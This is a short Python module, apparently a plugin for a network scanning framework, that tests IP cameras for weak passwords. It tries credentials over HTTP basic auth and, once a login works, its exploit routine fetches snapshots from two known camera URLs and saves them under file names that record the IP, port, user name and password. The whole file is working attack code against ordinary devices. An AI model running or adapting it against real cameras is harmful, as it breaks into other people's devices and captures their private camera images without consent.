import requests

from .base import WeakPasswordPOC


class IPCameraWeakPassword(WeakPasswordPOC):
    product_key = 'ipcamera'

    def _check(self, ip, port, user, password):
        r = requests.get(f"http://{ip}:{port}", auth=(user, password),
                         headers=self.headers, timeout=self.config.timeout, verify=False)
        return r.status_code == 200

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        img = f"{ip}-{port}-{user}-{password}.jpg"
        for url in [f"http://{ip}:{port}/media/?action=snapshot",
                    f"http://{ip}:{port}/cgi-bin/images_cgi?channel=0"]:
            if self._snapshot(url, img, auth=(user, password)):
                return 1
        return 0
